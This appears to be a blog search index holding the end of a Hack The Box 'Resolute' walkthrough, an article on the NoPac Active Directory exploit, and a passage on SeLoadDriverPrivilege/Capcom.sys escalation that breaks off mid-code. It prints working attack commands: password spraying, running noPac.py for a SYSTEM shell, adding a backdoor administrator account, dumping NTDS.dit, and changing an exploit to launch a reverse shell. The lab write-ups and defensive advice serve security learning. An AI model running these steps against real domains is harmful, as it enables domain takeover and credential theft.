groupsLdap_detailed.txt:\ncat groupsLdap_detailed.txt | grep -i -a Description -B 3 Nothing of note here Discoveries:\nNothing of note here Finding a hard-coded user password using LDAP User Enumeration: As my script auto enumerates this information: I check the file\u0026rsquo;s:\nusersLdap.txt usersLdap_detailed.txt usersLdap.txt provides a simple list of sam accounts present on the host that we can use for password spraying etc:\ncat usersLdap.txt Lets check for information in the description fields using usersLdap_detailed.txt:\ncat usersLdap_detailed.txt | grep -i Description -B 3 boom, user password. We also now know this a default password so we can password spray with our user list incase any other users have left their passwords as the default value. Password spraying all users with our found password: I password spray using the found password \u0026amp; list of users \u0026amp; get a hit for melanie: So this means taht the user Marko has changed theirs but Melanie has not. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Find an entry for ms02.megabank.local on an internal ip. (they are all internal but you know what I mean.) Kerberos 88: Usually I would use Kerbrute to bruteforce Usernames, however as we can query ldap directly we do not need to perform this. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Guest account is disabled and anonymous bind is also disabled. +Note+: The reason I am still checking for these is they would be findings in a real report. Trying Usernames as Passwords: I always try usernames as passwords as well: netexec smb $box -u Users.txt -p Users.txt --continue-on-success | grep [+] No hits 2. Foothold: Enumerating the domain as melanie: I check if we have remote access using evil-winrm \u0026amp; we do:\nevil-winrm -i $box -u $user -p $pass Let\u0026rsquo;s get our user flag:\nStrange LDAP Behavior: I try to run a remote bloodhound collection but it fails, It appears there is something with our user account which won\u0026rsquo;t enable it:\npython3 bloodhound.py -dc resolute.$domain -c All -u $user -p $user -d $domain -ns $box The same happens for asrep \u0026amp; kerberoasting:\nI upload SharpChrome.exe via my evil-winrm for a session: I get my collection:\nI think we may be on a second domain, as there are 2 domain mappings and we also so that other machine MS02 earlier. I look through the results but there are no immediate privesc paths apparent.\nTrying to load PowerView into memory: I upload PowerView.ps1 using evil-winrm but when I try and execute it I get the below message:\nThis script contains malicious content and has been blocked by your antivirus software. I try various download cradles but these are all blocked:\n+Deep Dive+: I have a deep dive into download cradles and how they work:\nhttps://bloodstiller.com/articles/understandingdownloadcradles/ Using Winpeas to enumerate: I upload WinPeas and run it to look if there are any privesc paths that are obvious:\nAutologon creds:\nManual Enumeration of System Information: Enumerating the password policy: Enumerating the password policy: net accounts We can spray without fear of lockout. Enumerating the Windows Version: I enumerate the windows version:\n[System.Environment]::OSVersion.Version As you can see systeminfo was denied but we can still query the build using env. Checking this build number online we can see it\u0026rsquo;s from version 1607: https://en.wikipedia.org/wiki/Windows_10_version_history I do also try and enumerate the patch/hotfix level but all efforts are blocked.\nEnumerating Installed Applications: I enumerate the installed applications by querying the registry:\n(\u0026#39;HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;, \u0026#39;HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation | sort-object -Property Displayname -Unique |Format-Table -AutoSize Nothing of note: Enumerating network services: I check what network services are running internally but again nothing immediate pops out: netstat -nao +Note+: I have dialed in on loopback/localhost incase there is anything running internally. Enumerate PATH: Enumerating the PATH:\n$Env:PATH The path is standard for a Windows environment: Here’s a breakdown:\nC:\\Windows\\system32: Primary system directory containing essential system files and executables. C:\\Windows: The root directory for the Windows OS. C:\\Windows\\System32\\Wbem: Contains files and tools for Windows Management Instrumentation (WMI). C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\: Path for PowerShell, used for executing scripts and commands. C:\\Users\\melanie\\AppData\\Local\\Microsoft\\WindowsApps: Path for user-specific Microsoft Store apps. Enumerate ENV\u0026rsquo;s: I enumerate the ENVs incase there is anything interesting: Get-ChildItem Env: Enumerating Drives: Checking Drives: Get-PsDrive This is standard output: Virtual drives: Like Alias, Cert, Env, Function, HKCU, HKLM, Variable, and WSMan are virtual drives created by PowerShell to allow easy navigation and management of things like aliases, environment variables, and the registry. Enumerating Scheduled Tasks: I try and enumerate scheduled tasks but I am denied: Manual Enumeration of users: Query Privileges, Groups \u0026amp; Logged in Users: whoami /priv /groups; query user; net user +Note+: The error below is because we are logged in with evil-winrm so it won\u0026rsquo;t be seen as a live logged in session. Manual Network Enumeration: List all network interfaces, IP, and DNS: ipconfig /all List the ARP table: arp -A List current routing table: route print Manual Service/Program Enumeration: Enumerating services using evil-winrm: This will work often when other methods are denied: services Enumerating Binaries with Weak Service Permissions using AccessChk \u0026amp; SharpUp.exe: When using accesschk, we want to check our current user first because our current user will likely belong to most-if-not-all of those groups by default.\nThis can help take the guess-work out of trying to find which group permissions were set on the service we are querying. I upload the binary via evil-winrm\nI can the following commands to find any service that is writeable for our current user / any user:\n.\\accesschk64.exe melanie -wuvc * -accepteula .\\accesschk64.exe \u0026quot;Everyone\u0026quot; -wuvc * -accepteula Denied each time, let\u0026rsquo;s try sharpup just incase. I upload SharpUp.exe and check for binaries with weak service permissions:\n.\\SharpUP.exe audit As I expected denied. Enumerate Startup Programs: Enumerate Startup Programs: Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl Denied Session Enumeration: I upload SessionGopher \u0026amp; check for any other existing sessions: There are none. 3. Privilege Escalation: Finding out the host is vulnerable to the NoPac vuln using netexec: I attempt to use netexec to check if it\u0026rsquo;s vulnerable:\nnetexec smb $box -u $user -p $pass -M nopac I get the error below. Troubleshooting\nScrolling down I see the below. Error explained: If you\u0026rsquo;ve encountered the error KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) when using tools like netexec etc. It likely stems from a time synchronization issue between your system and the target you\u0026rsquo;re trying to authenticate with. Kerberos relies heavily on timestamps as part of its secure authentication protocol, and even a small discrepancy in system time—typically more than five minutes—can cause the authentication process to fail. To resolve this issue, ensure both your machine and the target server are synced with the same accurate time source, such as using an NTP (Network Time Protocol) service. Which is what I will do now. I sync my clock with the host:\nsudo ntpdate -s resolute.$domain I re-run my test using netexec to check if it\u0026rsquo;s vulnerable:\nnetexec smb $box -u $user -p $pass -M nopac This time we see it\u0026rsquo;s vulnerable to the attack. +Note+: I want to be really clear how I knew to test for this specific vulnerability. I have a document that I go through when checking for privilege escalation paths (see below). Simple as that, I keep a central document that I will go through for privesc and checks and then if none of them work I look to other sources.\nI knew already that their was no WSUS vector as the service was not running \u0026amp; neither was CA abuse as it was not running. There were no AS-Reproastable users, as show in bloodhound \u0026amp; there were no users who had the correct perms for a shadow credential attack in bloodhound either. I\u0026rsquo;m telling you this as some walkthroughs make it seem like the attacker is a fountain of knowledge and has memorized all the latest attack vectors. Not the case, get a checklist and enumerate, that\u0026rsquo;s it. +Deep Dive+ I have created a deepdive into this particular exploit if you want to learn more:\nhttps://bloodstiller.com/articles/understandingnopacexploit/ 4. Ownership: Preparing the NoPac Exploit: Clone NoPac Exploit Repo:\ngit clone https://github.com/Ridter/noPac.git Create Python Virtual Environment:\nI prefer to use python venvs when using exploits this way I don\u0026rsquo;t mess with my underlying python install and everything can existing in it\u0026rsquo;s own space with it\u0026rsquo;s own dependencies cd noPac python3 -m venv noPac Activate Venv:\nsource noPac/bin/activate Install Dependencies:\npip3 install -r requirements Using the NoPac exploit to get a shell on the victim: I run the exploit to get a shell on the host:\nsudo python3 noPac.py $domain/$user:$pass -dc-ip $box -dc-host resolute -shell --impersonate administrator -use-ldap As you can see it says [!] Launching semi-interactive shell - Careful what you execute. This means we need to get our root flag and set up some simple persistence. I get the flag:\n5. Persistence: Adding a user as an administrator: Add ourselves as a user: As we have a limited \u0026amp; unstable shell access the easiest thing to do is add ourselves to the host \u0026amp; then as an administrator. This will then allow us to perform further persistence steps Add ourselves as a new user: net user bloodstiller bl00dst1ll3r! /add Add ourselves to the administrators group: net localgroup Administrators bloodstiller /add Dumping NTDS.dit: Dump NTDS.dit:\nNow we have administrator access as our user we can dump the NTDS.dit using netexec: netexec smb $box -u $user -p $pass -M ntdsutil Lets confirm the local adminstrator hash works:\nLessons Learned: What did I learn? LDAP is the best. But really it can be used to get alot of valuable information. What silly mistakes did I make? Nothing terrible this time. Slow methodical manual enumeration was the way to solve this box. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/resolute-box\/"
    },
    
    "http:\/\/localhost:1313\/articles\/understandingnopacexploit\/": {
        "title": "Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287",
        "tags": ["Active Directory","Windows","NoPac","CVE-2021-42278","CVE-2021-42287",],
        "content": "Introduction: In late 2021 the \u0026ldquo;NoPac\u0026rdquo; exploit leveraged two critical vulnerabilities in Microsoft\u0026rsquo;s Active Directory, potentially allowing an attacker to escalate from a standard user account to domain administrator privileges with alarming ease.\nKey Points:\nNoPac exploits two vulnerabilities: CVE-2021-42278 and CVE-2021-42287 It allows privilege escalation from a standard user to domain admin Understanding this exploit is crucial for system administrators and security professionals Let\u0026rsquo;s delve into the intricacies of NoPac, exploring the underlying vulnerabilities, mechanics, and the significant threat it posed to organizational security.\nUnderstanding the Vulnerabilities: At its core, the NoPac exploit takes advantage of two distinct but interrelated vulnerabilities in Microsoft\u0026rsquo;s Active Directory. Let\u0026rsquo;s examine each in detail:\nCVE-2021-42278: SAM Bypass Vulnerability: The first vulnerability, CVE-2021-42278 , is a bypass vulnerability in the Security Account Manager (SAM).\nKey Characteristics:\nAllows an attacker to manipulate the SamAccountName of a computer account. Enables changing a computer account name to match that of a Domain Controller. Exploits a flaw in how Active Directory handles computer account naming\u0026gt; Impact:\nCreates confusion in the domain\u0026rsquo;s naming structure. Sets the stage for the second part of the exploit. CVE-2021-42287: Kerberos PAC Vulnerability: The second vulnerability, CVE-2021-42287 , resides within the Kerberos Privilege Attribute Certificate (PAC) in Active Directory Domain Services (AD DS).\nKey Characteristics:\nAllows manipulation of Kerberos ticket issuance Exploits how the Key Distribution Center (KDC) handles service ticket requests Impact:\nEnables an attacker to obtain a service ticket for a Domain Controller When combined with CVE-2021-42278 , leads to privilege escalation The NoPac Exploit Process: To better understand the flow of the NoPac exploit, let\u0026rsquo;s look at a simplified diagram of the process:\n+--------------------------------------------------+ | | | +--------------------------------------------+ | | | | | | | 1. Initial Access | | | | - Standard domain user credentials | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 2. Exploit CVE-2021-42278 | | | | - Change computer account name | | | | - Match Domain Controller name | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 3. Request TGT | | | | - For the renamed computer account | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 4. Exploit CVE-2021-42287 | | | | - Request service ticket | | | | - KDC issues ticket for DC | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 5. Privilege Escalation | | | | - Obtain Domain Admin privileges | | | | | | | +--------------------------------------------+ | | | +--------------------------------------------------+ This diagram outlines the five main steps an attacker would typically follow when exploiting NoPac. Let\u0026rsquo;s dive deeper into each step.\nStep 1: Initial Access The attack begins with standard domain user credentials. It\u0026rsquo;s crucial to note that by default, authenticated users can add up to 10 computers to a domain, which is a key factor in this exploit.\nStep 2: Exploiting CVE-2021-42278: The attacker leverages CVE-2021-42278 to change the name of a new computer account to match a Domain Controller\u0026rsquo;s SamAccountName. This step exploits the vulnerability in how Active Directory handles computer account naming.\nStep 3: Requesting a TGT: With the renamed computer account, the attacker requests a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC).\nStep 4: Exploiting CVE-2021-42287: The attacker then exploits CVE-2021-42287 by requesting a service ticket. Due to the vulnerability in the Kerberos PAC, the KDC issues a ticket for the Domain Controller.\nStep 5: Privilege Escalation: With the obtained service ticket for the Domain Controller, the attacker can now escalate their privileges to Domain Admin level, effectively compromising the entire domain.\nReal-World Exploitation Example: To better understand how the NoPac exploit works in practice, let\u0026rsquo;s walk through a real-world example. This demonstration will show each step of the process, from initial access to achieving domain admin privileges.\nThis attack was performed on the Hack The Box machine Resolute: https://app.hackthebox.com/machines/Resolute My walkthrough is available here: https://bloodstiller.com/walkthroughs/resolute-box/ Prerequisites: Before we begin, ensure you have the following:\nA vulnerable Windows domain environment (pre-patch for CVE-2021-42278 and CVE-2021-42287) Standard domain user credentials Access to a machine joined to the domain The NoPac exploit \u0026amp; python installed: https://github.com/Ridter/noPac.git Step-by-Step Exploitation: 1 - Prepare the Exploit: Create Python Virtual Environment:\nI prefer to use python venvs when using exploits this way I don\u0026rsquo;t mess with my underlying python install and everything can existing in it\u0026rsquo;s own space with it\u0026rsquo;s own dependencies cd noPac python3 -m venv noPac Activate Venv:\nsource noPac/bin/activate Install Dependencies:\npip3 install -r requirements 2. Enumerate to find out if the target is vulnerable to the NoPac Exploit: Luckly the exploit we are using comes with a scanner, so this can be used to check if the host is vulnerable. kali in noPac 🍣 main 🛤️ ×1🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 14:00:18 zsh ✖ sudo python3 scanner.py $domain/$user:$pass -dc-ip $box -use-ldap ███ ██ ██████ ██████ █████ ██████ ████ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██████ ███████ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ██████ ██ ██ ██ ██████ [*] Current ms-DS-MachineAccountQuota = 10 [*] Got TGT with PAC from 10.129.96.155. Ticket size 1470 [*] Got TGT from 10.129.96.155. Ticket size 721 3. Execute the Exploit: Run the NoPac exploit tool with your standard domain user credentials.\nThe tool will automatically perform the necessary steps to exploit both vulnerabilities.\nHere\u0026rsquo;s an example of what the output might look like when running the NoPac exploit:\nkali in noPac 🍣 main 🛤️ ×1🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 14:38:42 zsh ❯ sudo python3 noPac.py $domain/$user:$pass -dc-ip $box -dc-host resolute -shell --impersonate administrator -use-ldap ███ ██ ██████ ██████ █████ ██████ ████ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██████ ███████ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ██████ ██ ██ ██ ██████ [*] Current ms-DS-MachineAccountQuota = 10 [*] Selected Target RESOLUTE.megabank.local [*] will try to impersonate administrator [*] Adding Computer Account \u0026#34;WIN-LE7ODKFREMZ$\u0026#34; [*] MachineAccount \u0026#34;WIN-LE7ODKFREMZ$\u0026#34; password = 7N9FdTniA0C9 [*] Successfully added machine account WIN-LE7ODKFREMZ$ with password 7N9FdTniA0C9. [*] WIN-LE7ODKFREMZ$ object = CN=WIN-LE7ODKFREMZ,CN=Computers,DC=megabank,DC=local [*] WIN-LE7ODKFREMZ$ sAMAccountName == RESOLUTE [*] Saving a DC\u0026#39;s ticket in RESOLUTE.ccache [*] Reseting the machine account to WIN-LE7ODKFREMZ$ [*] Restored WIN-LE7ODKFREMZ$ sAMAccountName to original value [*] Using TGT from cache [*] Impersonating administrator [*] Requesting S4U2self [*] Saving a user\u0026#39;s ticket in administrator.ccache [*] Rename ccache to administrator_RESOLUTE.megabank.local.ccache [*] Attempting to del a computer with the name: WIN-LE7ODKFREMZ$ [-] Delete computer WIN-LE7ODKFREMZ$ Failed! Maybe the current user does not have permission. [*] Pls make sure your choice hostname and the -dc-ip are same machine !! [*] Exploiting.. [!] Launching semi-interactive shell - Careful what you execute 4. Verify Privilege Escalation: Once the exploit completes, verify your new privileges using commands like whoami /groups or by attempting to access Domain Controller resources. C:\\Windows\\system32\u0026gt;whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== BUILTIN\\Administrators Alias S-1-5-32-544 Enabled by default, Enabled group, Group owner Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group Mandatory Label\\System Mandatory Level Label S-1-16-16384 5. Post-Exploitation: With Domain Admin privileges, you now have full control over the domain and can perform actions like dumping the NTDS.dit file or creating new domain admin accounts. To see my approach to this see my walkthrough: https://bloodstiller.com/walkthroughs/resolute-box/ Defending Against NoPac Attacks: Given the severity of the NoPac exploit, it\u0026rsquo;s crucial for system administrators to take steps to mitigate the risks. Here are some key defensive measures:\nApply Security Updates:\nImmediately apply the patches released by Microsoft for CVE-2021-42278 and CVE-2021-42287. Regularly check for and apply new security updates. Implement Least Privilege:\nRestrict user permissions to the minimum necessary for their roles. Regularly audit and review user and computer account permissions. Monitor Active Directory:\nImplement robust logging and monitoring for Active Directory events. Pay special attention to computer account name changes and unusual service ticket requests. Use Advanced Threat Detection:\nEmploy security information and event management (SIEM) tools to detect suspicious activities. Consider using Active Directory-specific security tools that can detect exploitation attempts. Conduct Regular Security Assessments:\nPerform frequent vulnerability scans and penetration tests. Use tools like PingCastle to assess the overall security posture of your Active Directory environment. Implement Network Segmentation:\nSeparate critical assets and limit lateral movement within the network. Use firewalls and access controls to restrict unnecessary communication between network segments. Educate and Train:\nEnsure IT staff are aware of the latest threats and mitigation strategies. Conduct regular security awareness training for all users. Remember, no single measure can provide complete protection against sophisticated attacks like NoPac. A defense-in-depth strategy, combining multiple layers of security controls, is crucial for comprehensive protection.\nConclusion: By leveraging two seemingly minor vulnerabilities, attackers can potentially compromise an entire domain with alarming ease. This underscores the critical importance of prompt patching, continuous monitoring, and a proactive approach to security.\nFurther Reading: For those interested in diving deeper into this topic, I recommend exploring:\nMicrosoft\u0026rsquo;s Security Update Guide for CVE-2021-42278 Microsoft\u0026rsquo;s Security Update Guide for CVE-2021-42287 https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware MITRE ATT\u0026amp;CK framework , particularly the entries on Initial Access and Privilege Escalation techniques Frequently Asked Questions: Q: How quickly should organizations patch for NoPac vulnerabilities? A: Organizations should treat these vulnerabilities as critical and apply patches as soon as possible, ideally within days of their release.\nQ: Can NoPac be exploited remotely? A: While initial access to the domain is required, once an attacker has standard domain user credentials, they can potentially exploit NoPac remotely.\nQ: Are there any signs that might indicate a NoPac attack has occurred? A: Signs may include unexpected computer account name changes, unusual service ticket requests. However, skilled attackers will attempt to cover their tracks.\nQ: Can NoPac be mitigated without applying patches? A: While patching is the most effective mitigation, other measures like restricting user permissions and monitoring Active Directory events can help reduce the risk. However, these should be considered temporary measures until patching can be completed.\nQ: How does NoPac compare to other Active Directory exploits? A: NoPac is particularly dangerous due to its relative simplicity and the potential for rapid privilege escalation. Unlike some exploits that require specific misconfigurations, NoPac could potentially affect any unpatched Active Directory environment.\n", 
        "url": "http:\/\/localhost:1313\/articles\/understandingnopacexploit\/"
    },
    
    "http:\/\/localhost:1313\/tags\/capcom\/": {
        "title": "Capcom",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/capcom\/"
    },
    
    "http:\/\/localhost:1313\/tags\/seloaddriverprivilege\/": {
        "title": "SeLoadDriverPrivilege",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/seloaddriverprivilege\/"
    },
    
    "http:\/\/localhost:1313\/articles\/seloaddriverprivilegeescalation\/": {
        "title": "Understanding SeLoadDriverPrivilege Escalation: A Deep Dive",
        "tags": ["Windows","Active Directory","SeLoadDriverPrivilege","Capcom",],
        "content": "Introduction: Among the various techniques employed by attackers, one particularly insidious method involves the exploitation of SeLoadDriverPrivilege. This Windows privilege, often overlooked, can serve as a powerful tool in the hands of malicious actors, enabling them to elevate their permissions and potentially gain complete control over a system.\nKey Points:\nSeLoadDriverPrivilege is a Windows privilege that can be exploited for privilege escalation It\u0026rsquo;s often overlooked but can grant attackers significant control over a system Understanding this vulnerability is crucial for system administrators and security professionals Let\u0026rsquo;s dive into the world of SeLoadDriverPrivilege and explore how this seemingly innocuous privilege can become a significant security risk.\nUnderstanding SeLoadDriverPrivilege: At its core, SeLoadDriverPrivilege grants the ability to load kernel-mode drivers into the Windows operating system. While this might sound benign, it\u0026rsquo;s a capability that normally requires administrative permissions, and for good reason. Kernel-mode drivers operate at the highest level of the system, with unrestricted access to system resources. This level of access is precisely what makes SeLoadDriverPrivilege so attractive to attackers.\nTypically, this privilege is assigned to administrative groups or specific users like Print Operators. It\u0026rsquo;s represented in the Windows API by the constant SE_LOAD_DRIVER_NAME. However, what makes it particularly dangerous is that it can sometimes be found enabled on accounts that aren\u0026rsquo;t full administrators, creating a potential security gap.\nKey Points:\nSeLoadDriverPrivilege allows loading of kernel-mode drivers Kernel-mode drivers have unrestricted access to system resources This privilege is usually assigned to administrative groups but can sometimes be found on non-admin accounts It\u0026rsquo;s represented by SE_LOAD_DRIVER_NAME in the Windows API The Exploitation Process: Overview \u0026amp; Diagram: To better understand the flow of a SeLoadDriverPrivilege exploit, let\u0026rsquo;s look at a simplified diagram of the process:\n+--------------------------------------------------+ | | | +--------------------------------------------+ | | | | | | | 1. Enable SeLoadDriverPrivilege | | | | - OpenProcessToken() | | | | - LookupPrivilegeValue() | | | | - AdjustTokenPrivileges() | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 2. Interact with Windows Registry | | | | - Access HKLM\\SYSTEM\\CurrentControlSet | | | | \\Services | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 3. Load Vulnerable Driver | | | | - Register driver in registry | | | | - Use NtLoadDriver() to load driver | | | | | | | +--------------------------------------------+ | | | | | v | | +--------------------------------------------+ | | | | | | | 4. Exploit Vulnerable Driver | | | | - Execute arbitrary code in kernel | | | | space | | | | - Gain SYSTEM privileges | | | | | | | +--------------------------------------------+ | | | +--------------------------------------------------+ This diagram outlines the four main steps an attacker would typically follow when exploiting SeLoadDriverPrivilege. Let\u0026rsquo;s dive deeper into each step.\nYou can see an example of this attack on my walkthrough for Fuse: https://bloodstiller.com/walkthroughs/fuse-box/ Step 1: Enabling the SeLoadDriverPrivilege Privilege: The first step involves activating the SeLoadDriverPrivilege. Windows uses a token-based system for managing user privileges, and SeLoadDriverPrivilege is usually disabled by default, even if it\u0026rsquo;s assigned to a user. Attackers can use Windows API functions like LookupPrivilegeValue() and AdjustTokenPrivileges() to enable this privilege on their token.\nStep 2: Registry Interaction: Once activated, SeLoadDriverPrivilege allows interaction with a critical area of the Windows Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services. This registry key is crucial for driver loading, and access to it is a key part of the exploitation process. Step 3: Loading a Vulnerable Driver: With the privilege activated and registry access established, the attacker can now load a driver of their choosing.\nThis is typically done by registering a malicious or vulnerable driver via the Windows registry and then using the NtLoadDriver() function to load it into kernel mode. Step 4: Exploiting the Driver: The final step involves exploiting the loaded driver. Attackers often choose to load known vulnerable drivers, such as the infamous Capcom.sys. (which is a Windows signed driver) These vulnerable drivers can be exploited to execute arbitrary code in kernel space, effectively giving the attacker complete control over the system.\nCapcom.sys Driver Vulnerability: Arbitrary Code Execution with SYSTEM Privileges Now that we\u0026rsquo;ve confirmed we have the necessary privilege and the system is vulnerable, let\u0026rsquo;s look at the specific vulnerability we\u0026rsquo;ll be exploiting.\nTL;DR: Key Takeaways Capcom.sys is a vulnerable driver that allows attackers to execute arbitrary code with SYSTEM privileges. Protections like VBS and HVCI can help mitigate risks, but require modern hardware. Driver block rules: can provide an additional layer of defense by preventing vulnerable drivers from loading. Overview of the Capcom.sys Vulnerability: The Capcom.sys kernel driver is notorious for its functionality that permits the execution of arbitrary code in kernel mode directly from user space.\nSpecifically, this driver disables SMEP (Supervisor Mode Execution Prevention) before invoking a function provided by the attacker, enabling us to run code with SYSTEM privileges.\nYou can find the real Capcom.sys driver on GitHub: Capcom.sys driver on GitHub Affected Windows Versions:\nThis exploit has been tested and verified on the following Windows versions: Windows 7 (x64) Windows 8.1 (x64) Windows 10 (x64) up to build 17134 (Version 1708) Windows 11 (x64) up to build 22000.194 (Version 21H2) Builds after 22000.194 contain deny lists that prevent this driver from loading. Security Considerations:\nModern versions of Windows have introduced protections like Virtualization-based Security (VBS) and Hypervisor-Protected Code Integrity (HVCI) to mitigate the risks posed by vulnerable drivers such as Capcom.sys.\nThese security mechanisms enforce code integrity in the kernel, allowing only signed code to execute and blocking known vulnerable or malicious drivers. However, it\u0026rsquo;s important to note that these features often require newer hardware and can have a performance impact.\nFor a deeper dive into the issue of signed vulnerable drivers, you can refer to:\nWeLiveSecurity\u0026rsquo;s article Mitigation Strategies:\nTo safeguard against vulnerabilities like this, Microsoft recommends implementing driver block rules as part of a comprehensive security policy. These block rules prevent the loading of known vulnerable or malicious drivers. Additionally, custom enterprise code integrity policies can be used to monitor and enforce these rules, with audit logs generated whenever a blocked driver attempts to load. For more on how to implement and enforce these rules, check out:\nRed Canary\u0026rsquo;s guide on driver block rules Real-World Exploitation Example To better understand how SeLoadDriverPrivilege exploitation works in practice, let\u0026rsquo;s walk through a real-world example. This demonstration will show each step of the process, from identifying the vulnerability to achieving system-level access.\nPrerequisites: Before we begin, ensure you have the following tools and environment set up:\nA Windows virtual machine for compiling the necessary tools:\nI recommend using https://github.com/mandiant/commando-vm Visual Studio for C++ compilation\nMsfvenom for payload generation\nA target Windows machine with SeLoadDriverPrivilege enabled for a non-admin user\nThis can be the Fuse machine on HTB or on an internal lab of your own. This is taken from my walkthrough of the HTB box fuse:\nhttps://bloodstiller.com/walkthroughs/fuse-box/ Finding out we have the SeLoadDriverPrivilege privilege: The first step in any privilege escalation attempt is to enumerate the current user\u0026rsquo;s privileges. In this case, we\u0026rsquo;re looking specifically for the SeLoadDriverPrivilege.\nI enumerate the privileges of my user: whoami /priv Checking my group memberships confirms this also: Checking the system is vulnerable to the exploit: Not all systems are vulnerable to this exploit, even if the SeLoadDriverPrivilege is present. We need to check the Windows build number to ensure it\u0026rsquo;s below a certain threshold.\nI check the build: [System.Environment]::OSVersion.Version It\u0026rsquo;s 14393 so we can move forward with this attack. Executing the Attack Now that we understand the vulnerability and have confirmed our system is susceptible, let\u0026rsquo;s walk through the actual attack process.\nI will include all steps as a means for you to be able to reproduce this with the box Fuse. Download A Copy of the official Capcom.sys Signed Driver: Download the official driver: wget https://github.com/FuzzySecurity/Capcom-Rootkit/raw/refs/heads/master/Driver/Capcom.sys We will keep it locally at the moment as there are some other tools we need to compile before we can move forward. Compiling the EopLoadDriver tool to enable us to load the Capcom.sys driver: The EopLoadDriver tool is a utility designed to leverage the SeLoadDriverPrivilege for loading a driver into the Windows kernel. It interacts with the Windows registry to register the driver and then uses the NtLoadDriver system call to load it. This tool is essential in our exploit chain as it allows us to load the vulnerable Capcom.sys driver, which we\u0026rsquo;ll subsequently exploit to gain SYSTEM privileges. By using EopLoadDriver, we\u0026rsquo;re able to bridge the gap between having the SeLoadDriverPrivilege and actually loading a driver of our choice into the kernel.\nPreparing the EopLoadDriver C++ Project:\nThis is a C++ file that will need to be compiled within Visual Studio:\nI download the project: https://github.com/TarlogicSecurity/EoPLoadDriver/ I create a new project: Then type Console into the search bar \u0026amp; select ConsolApp with C++ written below it. Click Next Give it a name \u0026amp; also select: Place solution and project in the same directory:\nHit \u0026quot;Create\u0026quot; This provides a standard Hello World template, which can be used as the basis for the project:\nImporting the EopLoadDriver code \u0026amp; Compiling:\nDelete all the code on the Hello World generated file \u0026amp; paste in the contents of Targlogic\u0026rsquo;s EopLoadDriver code: https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp Modify the imports by removing stdafx.h so they look like this now:\nRun the build and it should build successfully:\nCompiling the ExploitCapcom exploit C++ project The ExploitCapcom tool is the core component of our privilege escalation attack. It\u0026rsquo;s designed to exploit the vulnerability in the Capcom.sys driver that we\u0026rsquo;ve loaded using EopLoadDriver. This tool takes advantage of the driver\u0026rsquo;s ability to disable Supervisor Mode Execution Prevention (SMEP) and execute arbitrary code in kernel mode. By default, ExploitCapcom opens a new command prompt with SYSTEM privileges, but we\u0026rsquo;ll modify it to launch our custom payload instead. This tool effectively completes the privilege escalation chain, leveraging the loaded vulnerable driver to elevate our permissions to the highest level in the Windows operating system.\nImporting the ExploitCapcom C++ Project:\nThis time clone the repo:\nPaste in the repo url:\nhttps://github.com/tandasat/ExploitCapcom.git Modifying ExploitCapcom exploit to enable a reverse shell To make our exploit more useful, we\u0026rsquo;ll modify it to give us a reverse shell instead of just opening a new command prompt.\nOpen ExploitCapcom.cpp and do not remove the stdafx.h import:\nThe reason being is the actual required file containing the header is in this project. So you can compile with it. This exploit by default opens a new elevated shell, however this requires we have GUI access. So modify to run a reverse shell:\nBelow is the code we are going to modify:\nTCHAR CommandLine[] = TEXT(\u0026quot;C:\\\\Windows\\\\system32\\\\cmd.exe\u0026quot;); Modify it to run a reverse shell generated via msfvenom:\nRemember if you are not using the Fuse walkthrough to modify the path to one you have access to. // Launches a command shell process static bool LaunchShell() { //Original Line Commented Out: //TCHAR CommandLine[] = TEXT(\u0026#34;C:\\\\Windows\\\\system32\\\\cmd.exe\u0026#34;); TCHAR CommandLine[] = TEXT(\u0026#34;C:\\\\Users\\\\svc-print\\\\Documents\\\\shell.exe\u0026#34;); PROCESS_INFORMATION ProcessInfo; STARTUPINFO StartupInfo = { sizeof(StartupInfo) }; if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, \u0026amp;StartupInfo, 